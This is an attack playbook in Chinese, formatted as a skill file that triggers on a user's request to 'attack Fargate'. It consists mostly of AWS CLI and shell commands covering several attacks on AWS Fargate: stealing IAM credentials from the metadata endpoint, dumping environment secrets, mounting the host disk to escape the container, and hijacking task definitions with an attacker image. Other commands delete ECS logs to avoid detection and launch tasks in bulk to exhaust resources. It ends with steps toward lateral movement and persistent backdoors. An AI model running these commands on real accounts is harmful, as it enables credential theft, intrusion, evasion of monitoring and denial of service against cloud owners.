---
name: aws-fargate-attack
type: attack
category: serverless
platform: aws
severity: high
---

# AWS Fargate 攻击技能

## 触发条件

- 有 AWS 凭证
- 目标使用 Fargate
- 用户要求"攻击 Fargate"

## 前置检查

```bash
# 1. 验证凭证
aws sts get-caller-identity

# 2. 列出 Fargate 任务
aws ecs list-tasks --cluster CLUSTER_NAME

# 3. 检查 Launch Type
aws ecs describe-tasks \
  --cluster CLUSTER_NAME \
  --tasks TASK_ID \
  --query 'tasks[0].launchType'
```

## 攻击方法

### 方法 1: 元数据服务攻击

```bash
# 1. 通过 ECS Exec 访问容器
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "sh" \
  --interactive

# 2. 在容器内访问元数据服务
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# 3. 获取凭证并保存
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME > /tmp/fargate-creds.json
```

### 方法 2: Task Role 利用

```bash
# 1. 获取 Task Role ARN
aws ecs describe-tasks \
  --cluster CLUSTER_NAME \
  --tasks TASK_ID \
  --query 'tasks[0].taskDefinitionArn' --output text

# 2. 获取完整的 Task Definition
aws ecs describe-task-definition \
  --task-definition TASK_DEF_ARN

# 3. 提取 Task Role
aws ecs describe-task-definition \
  --task-definition TASK_DEF_ARN \
  --query 'taskDefinition.taskRoleArn' --output text

# 4. 伪装成 Task Role（从容器内获取凭证后）
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

### 方法 3: 环境变量窃取

```bash
# 1. 通过 ECS Exec 获取环境变量
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "env" \
  --interactive

# 2. 或者从 Task Definition 获取
aws ecs describe-task-definition \
  --task-definition TASK_DEF_NAME \
  --query 'taskDefinition.containerDefinitions[].environment'

# 3. 提取 Secrets Manager 引用
aws ecs describe-task-definition \
  --task-definition TASK_DEF_NAME \
  --query 'taskDefinition.containerDefinitions[].secrets'
```

### 方法 4: 容器逃逸尝试

```bash
# 1. 检查是否为特权容器
aws ecs describe-task-definition \
  --task-definition TASK_DEF_NAME \
  --query 'taskDefinition.containerDefinitions[].privileged'

# 2. 如果是特权容器，尝试逃逸
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "fdisk -l" \
  --interactive

# 3. 尝试挂载主机文件系统
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "mkdir /mnt/host && mount /dev/vda1 /mnt/host" \
  --interactive

# 4. 读取主机文件
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "cat /mnt/host/etc/passwd" \
  --interactive
```

### 方法 5: 挂载卷利用

```bash
# 1. 检查挂载的卷
aws ecs describe-task-definition \
  --task-definition TASK_DEF_NAME \
  --query 'taskDefinition.containerDefinitions[].mountPoints'

# 2. 如果有挂载 EFS 或其他卷
# 尝试访问敏感数据
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "ls -la /mnt/data" \
  --interactive

# 3. 下载敏感文件
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "cat /mnt/data/secret.txt | base64" \
  --interactive
```

### 方法 6: 网络利用

```bash
# 1. 获取任务的 ENI
aws ecs describe-tasks \
  --cluster CLUSTER_NAME \
  --tasks TASK_ID \
  --query 'tasks[0].attachments[0].details[] | [?name==`networkInterfaceId`].value' --output text

# 2. 获取网络配置
aws ec2 describe-network-interfaces \
  --network-interface-ids ENI_ID

# 3. 检查安全组
aws ec2 describe-security-groups \
  --group-ids SECURITY_GROUP_ID

# 4. 从容器内扫描同 VPC 主机
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "nmap -sn 10.0.0.0/24" \
  --interactive
```

### 方法 7: Task Definition 劫持

```bash
# 1. 获取当前 Task Definition
aws ecs describe-task-definition --task-definition TASK_DEF_NAME > current-task.json

# 2. 修改镜像为恶意镜像
jq '.taskDefinition.containerDefinitions[0].image = "attacker/malicious:latest"' \
  current-task.json > malicious-task.json

# 3. 注册新的 Task Definition
aws ecs register-task-definition --cli-input-json file://malicious-task.json

# 4. 更新服务使用新定义
aws ecs update-service \
  --cluster CLUSTER_NAME \
  --service SERVICE_NAME \
  --task-definition TASK_DEF_NAME:VERSION

# 5. 强制部署
aws ecs update-service \
  --cluster CLUSTER_NAME \
  --service SERVICE_NAME \
  --force-new-deployment
```

### 方法 8: CloudWatch 监控绕过

```bash
# 1. 检查是否启用 CloudWatch
aws ecs describe-tasks \
  --cluster CLUSTER_NAME \
  --tasks TASK_ID \
  --query 'tasks[0].containers[].logStream'

# 2. 如果未启用日志记录
# 可以在容器内执行恶意操作而不留痕迹

# 3. 或者修改日志级别
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "rm /var/log/ecs/*" \
  --interactive
```

### 方法 9: 跨容器攻击

```bash
# 1. 检查任务中的所有容器
aws ecs describe-tasks \
  --cluster CLUSTER_NAME \
  --tasks TASK_ID \
  --query 'tasks[0].containers[].name'

# 2. 从一个容器访问另一个容器
# 容器之间通常可以通过 localhost 或容器名称访问
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_1 \
  --command "curl http://container2:PORT/" \
  --interactive

# 3. 检查容器间共享的卷
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_1 \
  --command "ls -la /shared" \
  --interactive
```

### 方法 10: 资源耗尽攻击

```bash
# 1. 获取服务的 Auto Scaling 配置
aws application-autoscaling describe-scaling-policies \
  --service-namespace ecs \
  --resource-id service/CLUSTER_NAME/SERVICE_NAME

# 2. 如果有写权限，修改扩容策略
# 设置极大的最小任务数
aws application-autoscaling register-scalable-target \
  --service-namespace ecs \
  --resource-id service/CLUSTER_NAME/SERVICE_NAME \
  --scalable-dimension ecs:service:DesiredCount \
  --min-capacity 100 \
  --max-capacity 1000

# 3. 或者触发大量任务运行
for i in {1..100}; do
  aws ecs run-task \
    --cluster CLUSTER_NAME \
    --task-definition TASK_DEF_NAME \
    --launch-type FARGATE \
    --count 1
done
```

## 验证成功

```bash
# 成功执行命令
aws ecs execute-command \
  --cluster CLUSTER_NAME \
  --task TASK_ID \
  --container CONTAINER_NAME \
  --command "whoami" \
  --interactive

# 成功获取凭证
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# 成功获取环境变量
aws ecs describe-task-definition \
  --task-definition TASK_DEF_NAME \
  --query 'taskDefinition.containerDefinitions[].environment'
```

## 下一步

1. 使用获取的凭证访问其他 AWS 服务
2. 横向移动到其他 Fargate 任务或 ECS 任务
3. 利用网络配置访问内网资源
4. 建立持久化后门
